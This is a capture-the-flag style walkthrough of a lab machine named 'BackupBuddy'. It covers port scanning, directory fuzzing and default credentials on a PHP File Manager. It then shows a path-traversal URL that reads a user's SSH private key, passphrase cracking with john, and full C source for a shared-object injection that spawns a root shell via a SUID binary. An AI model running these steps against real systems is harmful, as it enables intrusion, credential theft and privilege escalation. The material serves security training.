# **BackupBuddy**

***
Difficulty : **Intermediate**

![image](https://github.com/user-attachments/assets/9102a8ed-bc0a-405f-a054-3fa508205910)

***

Running our nmap scan we have:


```
# Nmap 7.94SVN scan initiated Wed Jul 10 12:25:16 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.224.43
Increasing send delay for 192.168.224.43 from 0 to 5 due to 16 out of 39 dropped probes since last increase.
Increasing send delay for 192.168.224.43 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 192.168.224.43
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: PHP File Manager
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 41A82F56B3C9FF0CFB37E755CEFB8448
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 10 12:27:44 2024 -- 1 IP address (1 host up) scanned in 147.68 seconds
```



Navigating to port 80/HTTP we have the below logon form, however trying out default password including vulnerability validation like XSS and SQLI turned out negative




![](https://i.imgur.com/XO4CDXs.png)



The page although has a link that says **"PHP File Manager** and we are been lead to this [GitHub repository](https://github.com/alexantr/filemanager), There is nothing interesting than the name of this CMS in the repo, so i decided to search for public exploit and found an **authentication bypass** [PoC](https://packetstormsecurity.com/files/135384/PHP-File-Manager-0.9.8-Authentication-Bypass-Code-Execution.html)


![](https://i.imgur.com/37tNDp8.png)



Just like the screenshot above, it doesn't work, so let not waste time, we can go ahead and fuzz for hidden endpoint using the "**_Fuzz Faster U Fool_**" tool


```
ffuf -ic -u "http://192.168.224.43/FUZZ" -w /usr/share/wordlists/seclist/Discovery/Web-Content/directory-list-2.3-small.txt -fc 404,403,401 -fw 63 -e .txt,.php,.bak,.sql,.pdf,.png,.jpg,.jpeg,.html
```



![](https://i.imgur.com/3bflRWj.png)



We found a `/files` directory which has few images including a `/backup` directory that also has an image



![](https://i.imgur.com/JfYlW5A.png)


Decided to download all images with wget and run a brief analysis on them



![](https://i.imgur.com/1AH2in8.png)



However there is nothing in this images as they seem really normal to me


![](https://i.imgur.com/WHA10kp.png)



Checking the `/readme` endpoint we have leaked credentials which is the default username and password for the CMS


![](https://i.imgur.com/yYvD6uC.png)




Decided to try it out on the logon endpoint and whoa it worked xD, we can also see that we have a backup directory together with the owners name known as `brian`


![](https://i.imgur.com/d5eoNYh.png)




Well i thought it was time to login via SSH, i mean it is worth trying 😎, but hell nah, wrong authentication 



![](https://i.imgur.com/XOSSwdq.png)


Inspecting the URL of the website, it looks like the page is vulnerable to LFI cos it is directly calling the `/backups` directory



![](https://i.imgur.com/93nGGN0.png)



Well guess what, LFI!!!!!!!!!!!!!!!!


![](https://i.imgur.com/8MtN87t.png)



Quickly navigated to user `brian` home folder and we have the `id_rsa` file for this user

Link : [http://192.168.224.43/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fbrian%2F.ssh](http://192.168.224.43/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fbrian%2F.ssh)



![](https://i.imgur.com/Qt71G7p.png)




Well copied the `id_rsa` for the user and tried login in, however the `id_rsa` file is encrypted and we need to decrypt it, soo let go ahead and do that using `ssh2john` 


```bash
chmod 600 id_rsa
ssh brian@192.168.224.43 -i id_rsa
```


![](https://i.imgur.com/Q1uzH4l.png)



```bash
ssh2john id_rsa > hash.txt
```



![](https://i.imgur.com/lSRgvBz.png)



```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```



![](https://i.imgur.com/Iui3kzd.png)


Now we can login as user `brian` via SSH by specifying the cracked passphrase


![](https://i.imgur.com/8NgLNx8.png)



Checking for binaries with the SUID bit set we found a suspicious `backup` binary


```bash
find / -perm -4000 2>/dev/null
```


![](https://i.imgur.com/JuHQtWD.png)



Running this binary looks like it start a backup process but hell nah, it doesn't work that way so i decided to use the `strings` command on the file in which as shown below we can see that a `libm.so` file is been called under user `brian` home folder, we need to do a **Shared Object Injection** attack due to the fact that a `.so` file is been called



![](https://i.imgur.com/6SSgFIP.png)


Checking for the `.config` directory i did not find any directory like that


![](https://i.imgur.com/Sih5l06.png)



So we can go ahead and  create the `.confg/` directory ourselves and then compile this malicious `C` code to `.so` to give us a root shell which could be gotten from [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example#exploit)



![](https://i.imgur.com/B6eZ8Q0.png)


Compiling the exploit and running it doesn't seem to work, we are still getting the same response.


```
gcc -shared -o .config/libm.so libm.c
```



![](https://i.imgur.com/ShtfE1O.png)



However after several enumeration with a CLI utility called `strace`, i was able to figure it out, it was just all about modifying the `C` code and this would have saved me several hours, at last the below code helped me to get what i want



```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
```



![](https://i.imgur.com/NQBNZri.png)








